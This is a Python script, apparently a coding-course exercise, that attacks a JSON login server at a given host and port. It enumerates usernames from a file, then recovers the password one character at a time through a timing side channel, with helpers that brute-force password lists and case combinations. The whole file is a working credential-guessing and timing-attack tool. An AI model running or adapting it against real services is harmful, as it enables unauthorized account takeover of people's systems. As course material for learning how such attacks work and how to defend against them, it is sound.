import itertools
import json
import logging
import socket
import string
import sys
from time import time


def main():
    # get commandline arguments
    host = sys.argv[1]
    port = int(sys.argv[2])

    with open("logins.txt", "r") as file:
        logins = [p.strip("\n") for p in file]
    logger.debug('Read possible logins from file')

    with socket.socket() as client_socket:
        client_socket.connect((host, port))
        logger.debug('Client socket connected on %s port %s', host, port)
        for login in logins:
            logger.debug('Try login: %s', login)
            json_auth_str = auth_json(login, "x")
            logger.debug('Send JSON string: %s', json_auth_str)
            client_socket.send(json_auth_str.encode())
            response = client_socket.recv(1024).decode()
            logger.debug('Received JSON string: %s', response)
            if not response.startswith("{\"result\": \"Wrong login!\"}"):
                logger.info('Received JSON: %s', response)
                logger.info('Login found: %s', login)
                break

        # found login, now try passwords
        letters = string.ascii_letters + string.digits
        password_length = 1
        password_found = False
        password = ""
        while not password_found:
            logger.info("Password length = %s", password_length)
            for letter in letters:
                json_auth_str = auth_json(login, password + letter)
                client_socket.send(json_auth_str.encode())
                start = time()
                response = client_socket.recv(1024).decode()
                end = time()
                logger.debug('Response took: %s seconds', end - start)
                if (end - start) >= 0.05:
                    password += letter
                    logger.info('Password found: %s', "".join(password))
                    break
                if response.startswith("{\"result\": \"Connection success!\"}"):
                    password += letter
                    logger.info('Received JSON: %s', response)
                    logger.info('Password found: %s', "".join(password))
                    password_found = True
                    break
            password_length += 1

    print(auth_json(login, "".join(password)))


def auth_json(login: str, pswd: str):
    # returns proper json string from login and pswd
    auth_dict = {"login": login, "password": pswd}
    return json.dumps(auth_dict)


def upper_lower_mix(word: str) -> list[str]:
    # mixes up word in upper/lower case combinations
    # for example "fox" will become ["fox", "FoX", "fOX", ...]
    # uses an algorith seen in https://stackoverflow.com/questions/11144389/find-all-upper-lower-and-mixed-case-combinations-of-a-string
    prod = itertools.product(*zip(word.lower(), word.upper()))
    return ["".join(w) for w in prod]


def check_password_list(client_socket: socket.socket, passwords:list[str]) -> tuple[bool, str]:
    for password in passwords:
        client_socket.send(password.encode())
        response = client_socket.recv(1024).decode()
        if response == "Connection success!":
            return True, password
    return False, ""


def check_passwords_in_given_length(client_socket: socket.socket, passwords: itertools.product) -> tuple[int, str]:
    for password in passwords:
        msg = "".join(password).encode()
        client_socket.send(msg)
        response = client_socket.recv(1024).decode()
        if response == "Connection success!":
            return 1, msg.decode()
        if response == "Too many attempts":
            return 2, ""
    return 0, ""


if __name__ == "__main__":
    logger = logging.getLogger(__name__)
    logging.basicConfig(filename='hack.log', encoding='utf-8', level=logging.INFO,
                        format='[%(asctime)s %(levelname)s %(lineno)s - %(funcName)s()]  %(message)s')
    # logger.debug('This message should go to the log file')
    # logger.info('So should this')
    # logger.warning('And this, too')
    # logger.error('And non-ASCII stuff, too, like Øresund and Malmö')
    main()